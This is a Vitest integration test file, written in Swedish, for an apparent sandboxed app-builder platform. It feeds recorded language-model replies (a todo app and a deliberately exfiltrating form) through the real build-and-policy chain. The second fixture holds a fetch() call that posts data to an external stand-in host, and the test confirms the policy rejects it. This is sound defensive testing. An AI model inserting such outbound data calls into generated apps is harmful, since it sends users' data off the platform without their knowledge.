/**
 * Integration med den RIKTIGA byggkedjan (`local`: policy → tsc → Vite → kontroll av bygget) och
 * en inspelad språkmodell som svarar med en realistisk todo-app i protokollets format. Visar att
 * agent + policy + bygge + import + förhandsvisning fungerar ihop genom den riktiga gatewayn.
 */
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import type { BuilderJob } from '@vibesandbox/contracts';
import { modellsvar } from './stod/byggkedja.ts';
import { Webblasare } from './stod/webblasare.ts';
import type { Svar } from './stod/webblasare.ts';
import { BYGG, BYGG_ORIGIN, loggaInMedKod, startaPlattform } from './stod/plattform.ts';
import type { Testplattform } from './stod/plattform.ts';

const TODO_APP = modellsvar('En todo-lista där alla som får öppna appen ser samma uppgifter och kan bocka av dem.', {
  'src/App.tsx': `import { useEffect, useState } from 'react';
import type { FormEvent } from 'react';
import { db, SdkError } from '@vibesandbox/sdk';
import type { Doc } from '@vibesandbox/sdk';

interface Uppgift {
  text: string;
  klar: boolean;
}

const uppgifter = db.collection<Uppgift>('uppgifter');

function felText(error: unknown): string {
  return error instanceof SdkError ? error.message : 'Något gick fel. Försök igen.';
}

export function App() {
  const [lista, setLista] = useState<Doc<Uppgift>[]>([]);
  const [laddar, setLaddar] = useState(true);
  const [fel, setFel] = useState('');
  const [text, setText] = useState('');

  useEffect(() => {
    uppgifter
      .list()
      .then((alla) => setLista(alla))
      .catch((error: unknown) => setFel(felText(error)))
      .finally(() => setLaddar(false));
  }, []);

  async function laggTill(event: FormEvent) {
    event.preventDefault();
    setFel('');
    try {
      const ny = await uppgifter.add({ text: text.trim(), klar: false });
      setLista((tidigare) => [...tidigare, ny]);
      setText('');
    } catch (error) {
      setFel(felText(error));
    }
  }

  async function vaxla(uppgift: Doc<Uppgift>) {
    setFel('');
    try {
      const andrad = await uppgifter.update(uppgift.id, { ...uppgift.data, klar: !uppgift.data.klar });
      setLista((tidigare) => tidigare.map((annan) => (annan.id === andrad.id ? andrad : annan)));
    } catch (error) {
      setFel(felText(error));
    }
  }

  return (
    <main>
      <h1>Att göra</h1>
      <form onSubmit={laggTill}>
        <label htmlFor="text">Ny uppgift</label>
        <input id="text" value={text} onChange={(e) => setText(e.target.value)} required maxLength={200} />
        <button type="submit">Lägg till</button>
      </form>
      {fel !== '' && <p role="alert">{fel}</p>}
      {laddar ? (
        <p>Hämtar uppgifter …</p>
      ) : lista.length === 0 ? (
        <p>Inga uppgifter än.</p>
      ) : (
        <ul>
          {lista.map((uppgift) => (
            <li key={uppgift.id}>
              <label>
                <input type="checkbox" checked={uppgift.data.klar} onChange={() => vaxla(uppgift)} />
                {uppgift.data.text}
              </label>
            </li>
          ))}
        </ul>
      )}
    </main>
  );
}`,
  'src/styles.css': `main {
  max-width: 40rem;
  margin: 0 auto;
  padding: 1rem;
  font-family: system-ui, sans-serif;
}

li label {
  display: flex;
  gap: 0.5rem;
}`,
});

const EXFILTRERANDE_APP = modellsvar('Formuläret skickar svaren till dig.', {
  'src/App.tsx': `export function App() {
  const skicka = () => fetch('https://extern.example.org/svar', { method: 'POST', body: 'hej' });
  return <main><button type="button" onClick={skicka}>Skicka</button></main>;
}`,
});

function json<T>(svar: Svar): T {
  return JSON.parse(svar.body) as T;
}

async function bestall(anna: Webblasare, text: string): Promise<{ appId: string; jobb: BuilderJob }> {
  const { appId } = json<{ appId: string }>(await anna.api(BYGG, 'POST', '/_api/builder/apps', { json: {}, origin: BYGG_ORIGIN }));
  const { jobId } = json<{ jobId: string }>(
    await anna.api(BYGG, 'POST', `/_api/builder/apps/${appId}/messages`, { json: { text }, origin: BYGG_ORIGIN }),
  );
  for (let forsok = 0; forsok < 600; forsok += 1) {
    const jobb = json<BuilderJob>(await anna.api(BYGG, 'GET', `/_api/builder/jobs/${jobId}`, { origin: null }));
    if (jobb.status === 'done' || jobb.status === 'failed') return { appId, jobb };
    await new Promise((resolve) => setTimeout(resolve, 50));
  }
  throw new Error('Jobbet blev aldrig klart.');
}

describe('Den riktiga byggkedjan (local) i plattformen', () => {
  let plattform: Testplattform;
  let anna: Webblasare;

  afterEach(async () => {
    await plattform.stang();
  });

  describe('en realistisk todo-app', () => {
    beforeEach(async () => {
      plattform = await startaPlattform({ identitet: 'email-otp', riktigByggkedja: true, modellsvar: [TODO_APP] });
      await plattform.platform.addUser('anna@example.org', 'builder');
      anna = new Webblasare(plattform.port);
      await loggaInMedKod(anna, plattform, BYGG, 'anna@example.org');
    });

    it('byggs, blir utkast och serveras i förhandsvisningen — skript och stil från appens egen värd', async () => {
      const { appId, jobb } = await bestall(anna, 'En todo-lista');
      expect(jobb.status, JSON.stringify(jobb.events)).toBe('done');
      expect(jobb.events).toContainEqual({ type: 'check', ok: true, problems: 0 });

      const pHost = `p-${appId}.example.org`;
      await loggaInMedKod(anna, plattform, pHost, 'anna@example.org');
      const sida = await anna.oppna(pHost, '/');
      expect(sida.status).toBe(200);
      // Mallen bygger med relativa adresser (`./assets/…`); de ska ligga under appens egen värd.
      const absolut = (relativ: string | undefined): string | undefined =>
        relativ === undefined ? undefined : new URL(relativ, `http://${pHost}/`).pathname;
      const skript = absolut(/<script[^>]*src="(\.?\/assets\/[^"]+\.js)"/.exec(sida.body)?.[1]);
      const stil = absolut(/<link[^>]*href="(\.?\/assets\/[^"]+\.css)"/.exec(sida.body)?.[1]);
      expect(skript).toBeDefined();
      expect(stil).toBeDefined();

      const js = await anna.skicka(pHost, { path: skript ?? '', headers: { 'Sec-Fetch-Mode': 'no-cors' } });
      expect(js.status).toBe(200);
      expect(js.headers['content-type']).toMatch(/javascript/);
      // Det språkmodellen skrev finns i det byggda skriptet.
      expect(js.body).toContain('Inga uppgifter än.');
      expect(js.body).toContain('uppgifter');
      const css = await anna.skicka(pHost, { path: stil ?? '', headers: { 'Sec-Fetch-Mode': 'no-cors' } });
      expect(css.status).toBe(200);
      expect(css.headers['content-type']).toMatch(/text\/css/);

      // Och den går att publicera och öppna på sin riktiga adress.
      const publicerad = await anna.api(BYGG, 'POST', `/_api/builder/apps/${appId}/publish`, { origin: BYGG_ORIGIN });
      expect(publicerad.status).toBe(200);
      const appHost = `${appId}.example.org`;
      await loggaInMedKod(anna, plattform, appHost, 'anna@example.org');
      expect((await anna.skicka(appHost, { path: skript ?? '', headers: { 'Sec-Fetch-Mode': 'no-cors' } })).status).toBe(200);
    }, 120_000);
  });

  describe('kod som skickar data ut', () => {
    beforeEach(async () => {
      plattform = await startaPlattform({ identitet: 'email-otp', riktigByggkedja: true, modellsvar: [EXFILTRERANDE_APP] });
      await plattform.platform.addUser('anna@example.org', 'builder');
      anna = new Webblasare(plattform.port);
      await loggaInMedKod(anna, plattform, BYGG, 'anna@example.org');
    });

    it('stoppas av den riktiga policyn: inget utkast, och förklaringen i klarspråk', async () => {
      const { appId, jobb } = await bestall(anna, 'Ett formulär som mejlar svaren till mig');
      expect(jobb.status).toBe('failed');
      const avslut = jobb.events.find((h) => h.type === 'done');
      expect(avslut).toMatchObject({ type: 'done', ok: false });
      expect(avslut?.type === 'done' ? avslut.message : '').toMatch(/utanför plattformen|internet/);
      // Ett säkerhetsbrott ger inga fler försök.
      expect(plattform.modell.requests).toHaveLength(1);
      expect((await anna.api(BYGG, 'GET', `/_api/builder/apps/${appId}/open?target=preview`, { origin: null })).status).toBe(409);
    }, 60_000);
  });
});
